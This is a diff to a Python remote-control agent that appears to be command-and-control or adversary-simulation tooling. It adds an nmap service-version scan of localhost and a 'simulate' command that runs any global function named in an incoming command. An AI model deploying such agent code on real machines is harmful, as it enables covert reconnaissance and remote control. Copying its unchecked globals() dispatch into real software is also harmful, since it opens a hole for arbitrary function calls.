@@ -15,6 +15,7 @@ import string
 import re
 import json
 import ctypes
+import nmap
 
 os_info = {
         "OS Name": os.name,
@@ -37,6 +38,11 @@ agent_name_pattern = r"[^a-zA-Z0-9_]"
 
 key = 0
 nonce = 0
+
+if os_info["System"] == "Windows":
+    nm_scanner = nmap.PortScanner(nmap_search_path=('C:\\Program Files (x86)\\Nmap\\nmap.exe',))
+else:
+    nm_scanner = nmap.PortScanner()
 
 def start_conn():
     global agent_name
@@ -148,9 +154,15 @@ def sec_recv(sock: socket, key, nonce) -> bytes:
 
     return mess
 
+def services_scan():
+    nm_scanner.scan(hosts='127.0.0.1', arguments='-sV -Pn -T5')
+    return str(nm_scanner['127.0.0.1'])
+
 def excute_cmd(cmd_args: list):
    try:
     match cmd_args[0]:
+        case "simulate":
+            return simulate_cmd(cmd_args)
         case "exec":
             return exec_cmd(cmd_args)
         case "agents":
@@ -160,6 +172,13 @@ def excute_cmd(cmd_args: list):
    except:
        print("*Command error!")
    return 0
+
+def simulate_cmd(cmd_args: list):
+    if cmd_args[1] in globals():
+        return globals()[cmd_args[1]]()
+    else:
+        print("*simulate error. Please type \"help\" for help.")
+
 
 def exec_cmd(cmd_args: list):
     cmd = cmd_args[1]
